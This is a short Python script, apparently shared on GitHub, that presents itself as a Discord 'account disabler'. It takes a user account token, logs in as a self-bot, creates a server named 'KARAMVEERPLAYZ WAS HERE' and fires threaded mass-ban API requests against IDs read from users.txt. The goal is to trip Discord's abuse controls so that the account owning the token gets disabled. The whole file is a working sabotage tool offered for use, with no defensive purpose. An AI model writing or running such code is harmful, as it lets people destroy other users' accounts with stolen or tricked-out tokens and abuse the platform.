'''
- Created By KaramveerPlayZ#1337
- https://discord.gg/lgnop
- Star The Github Repo & Fork If You Like It
'''
import os
os.system("pip install discord.py==1.7.3")
import discord
import requests
import discord.ext.commands
import threading

os.system("clear")

token = input("[-] User Account Token To Disable: ")


client = discord.ext.commands.Bot(command_prefix="account-disabler-by-karamveerplayz#1337", self_bot=True, intents=discord.Intents.all(), help_command=None)
headers = {'Authorization': token}
sexion = requests.Session()
with open("users.txt", 'r') as f:
  members = f.read().splitlines()


def massban(guild, member):
  response = sexion.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
  if response.status_code in [200, 204, 201]:
    print(f"[+] Successfully Banned {member}")
  else:
    if response.status_code == 429:
      print("KaramveerPlayZ#1337 | Account Disabled")
    else:      
      print(f"[-] Failed To Ban Member {member}, Status Code {response.status_code}")

@client.event
async def on_ready():
  print("Logged In As {}".format(client.user))
  print(f"Attempting To Disable {client.user} | Created By KaramveerPlayZ#1337")
  nvm = await client.create_guild(name="KARAMVEERPLAYZ WAS HERE")
  ripp = int(nvm.id)
  for member in members:
    threading.Thread(target=massban, args=(ripp, member,)).start()

try:
  client.run(token, bot=False)
except:
  print("[-] Invaild Token, Maybe Rate Limited.")
